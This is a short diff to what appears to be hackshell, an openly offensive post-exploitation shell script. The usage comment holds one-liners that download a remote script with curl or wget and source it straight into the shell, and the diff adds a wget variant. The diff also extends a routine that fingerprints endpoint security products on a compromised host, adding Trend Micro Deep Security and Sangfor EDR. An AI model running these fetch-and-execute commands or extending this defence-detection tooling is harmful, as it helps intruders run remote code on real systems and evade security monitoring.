@@ -12,6 +12,7 @@
 # Usage:
 #     source <(curl -SsfL https://thc.org/hs)
 #     source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
+#     source <(wget -qO-  https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
 #
 # Environment variables (optional):
 #    XHOME=         Set custom XHOME directory [default: /dev/shm/.$'\t''~?$:?']
@@ -882,9 +883,12 @@ _warn_edr() {
     _hs_chk_fn "/etc/clamd.d/scan.conf"            "ClamAV"
     _hs_chk_fn "$(command -v clamscan)"            "ClamAV"
     _hs_chk_fn "/opt/CrowdStrike/falconctl"        "CrowdShite"
+    _hs_chk_fn "/var/opt/ds_agent/dsa_core/ds_agent.db"   "Trend Micro Deep Security Agent"
+    _hs_chk_fn "/opt/ds_agent/dsa"                        "Trend Micro Deep Security Agent"
     _hs_chk_fn "/etc/freshclam.conf"               "ClamAV"          
     _hs_chk_fn "/etc/rkhunter.conf"                "RootKit Hunter"
     _hs_chk_fn "$(command -v rkhunter)"            "RootKit Hunter"
+    _hs_chk_fn "/sf/edr/agent/bin/edr_agent"       "Sangfor EDR"
 
     [ "${#fns[@]}" -ne 0 ] && out="$(\ls -alrt "${fns[@]}")"$'\n'
 
